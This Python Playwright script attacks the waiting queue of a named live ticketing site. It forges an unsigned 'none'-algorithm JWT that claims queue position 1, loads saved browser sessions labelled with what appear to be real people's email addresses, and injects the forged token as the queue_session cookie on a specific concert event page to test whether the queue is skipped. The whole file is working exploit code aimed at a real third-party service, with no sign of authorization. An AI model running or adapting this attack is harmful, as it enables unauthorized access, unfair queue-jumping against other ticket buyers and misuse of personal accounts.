#!/usr/bin/env python3
"""
Test the queue_session none-algorithm token against a live webook event.

Loads a saved session, navigates to a queued event, injects the none-alg
token as the queue_session cookie, and checks whether the backend accepts it.

Usage:
    python test-none-token-live.py --session sessions/tariqibrahim20@hotmail.com.json
    python test-none-token-live.py --session sessions/banderksa9@hotmail.com.json --headless
"""

import argparse
import base64
import json
import os
import sys
import time
import urllib.parse

from playwright.sync_api import sync_playwright


def make_none_alg_token(position=1, ttl=3600, user_agent=""):
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "e": int(time.time()) + ttl,
        "n": position,
        "u": user_agent[::-1],
    }
    b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("=")
    return f"{b64(header)}.{b64(payload)}."


def load_session(session_path):
    with open(session_path, "r", encoding="utf-8") as f:
        return json.load(f)


def find_queued_event_url(session):
    """Try to find a queued event URL from the session cookies/origins."""
    for cookie in session.get("cookies", []):
        url = cookie.get("url", "")
        if "webook.com" in url and "/events/" in url:
            return url
    # Fallback to a known queued event from captures
    return "https://webook.com/ar/events/ramy-sabry-jeddah-concert-2026-tickets"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--session", required=True, help="Path to saved Playwright session JSON")
    parser.add_argument("--url", help="Override queued event URL")
    parser.add_argument("--headless", action="store_true", help="Run headless")
    parser.add_argument("--position", type=int, default=1, help="Queue position to claim")
    parser.add_argument("--ttl", type=int, default=7200, help="Token TTL in seconds")
    args = parser.parse_args()

    if not os.path.exists(args.session):
        print(f"Session file not found: {args.session}")
        sys.exit(1)

    session = load_session(args.session)
    event_url = args.url or find_queued_event_url(session)

    # Use a realistic UA that matches the saved session if possible
    user_agent = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    none_token = make_none_alg_token(args.position, args.ttl, user_agent)
    print(f"Event URL: {event_url}")
    print(f"none-alg token: {none_token}")
    print()

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=args.headless)
        context = browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent=user_agent,
        )

        # Load cookies from saved session
        cookies = session.get("cookies", [])
        if cookies:
            # Ensure required fields are present
            fixed = []
            for c in cookies:
                if "sameSite" in c and c["sameSite"] not in ("Strict", "Lax", "None"):
                    del c["sameSite"]
                fixed.append(c)
            context.add_cookies(fixed)

        page = context.new_page()

        # First visit to establish context and read original queue state
        print("[1/3] Visiting event page with original queue_session...")
        page.goto(event_url, wait_until="networkidle", timeout=60000)
        time.sleep(3)

        original_state = page.evaluate("""
            () => {
                const queueSession = document.cookie.split('; ').find(r => r.startsWith('queue_session='));
                return {
                    url: window.location.href,
                    queueSessionPresent: !!queueSession,
                    bodyText: document.body ? document.body.innerText.slice(0, 500) : '',
                    hasQueueUI: !!document.querySelector('[data-testid*="queue"], [class*="queue"], [class*="Queue"]')
                };
            }
        """)
        print("Original state:", json.dumps(original_state, ensure_ascii=True, indent=2))
        print()

        # Inject the none-alg token as queue_session cookie
        print("[2/3] Injecting none-alg queue_session cookie...")
        parsed = urllib.parse.urlparse(event_url)
        context.add_cookies([{
            "name": "queue_session",
            "value": none_token,
            "domain": ".webook.com",
            "path": "/",
            "httpOnly": False,
            "secure": True,
            "sameSite": "Lax",
        }])

        # Also set via JS to be sure
        page.evaluate(f"""
            () => {{
                document.cookie = 'queue_session={none_token}; path=/; domain=.webook.com; Secure; SameSite=Lax';
            }}
        """)

        # Reload and observe
        print("[3/3] Reloading with none-alg token...")
        page.reload(wait_until="networkidle", timeout=60000)
        time.sleep(5)

        new_state = page.evaluate("""
            () => {
                const queueSession = document.cookie.split('; ').find(r => r.startsWith('queue_session='));
                const queueSessionValue = queueSession ? queueSession.split('=')[1] : null;
                return {
                    url: window.location.href,
                    queueSessionValue: queueSessionValue ? queueSessionValue.slice(0, 80) + '...' : null,
                    bodyText: document.body ? document.body.innerText.slice(0, 500) : '',
                    hasQueueUI: !!document.querySelector('[data-testid*="queue"], [class*="queue"], [class*="Queue"]'),
                    queueTexts: Array.from(document.querySelectorAll('body, body *')).map(e => e.innerText).filter(t => t && /queue|Queue|موقعك|دورك|انتظار/i.test(t)).slice(0, 10)
                };
            }
        """)
        print("After none-alg state:", json.dumps(new_state, ensure_ascii=True, indent=2))
        print()

        if new_state["hasQueueUI"]:
            print("[!] Queue UI still present. none-alg bypass did NOT work (or page was not queued).")
        else:
            print("[+] Queue UI not detected. Possible bypass! Verify by checking if booking flow proceeds.")

        # Save screenshot for manual review
        screenshot_path = "none-token-test.png"
        page.screenshot(path=screenshot_path, full_page=True)
        print(f"Screenshot saved: {screenshot_path}")

        browser.close()


if __name__ == "__main__":
    main()
